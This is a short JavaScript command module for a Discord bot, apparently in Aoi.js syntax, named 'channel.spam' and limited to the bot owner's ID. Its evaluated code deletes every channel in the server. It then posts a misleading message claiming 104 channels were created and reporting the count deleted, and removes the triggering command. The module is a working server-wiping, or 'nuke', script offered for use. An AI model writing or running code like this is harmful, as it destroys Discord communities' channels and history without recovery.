module.exports = {
  name:"channel.spam",
  code:`
  $djsEval[message.guild.channels.cache.filter(channel => channel).map(channel => channel.delete(channel))]
  $sendMessage[
  104 Channel Created :white_check_mark:
  $channelCount Channel Deleted :white_check_mark:
  Wait... ⌛;no]  
  $deletecommand
  $onlyforids[$botownerid;]
  `
}
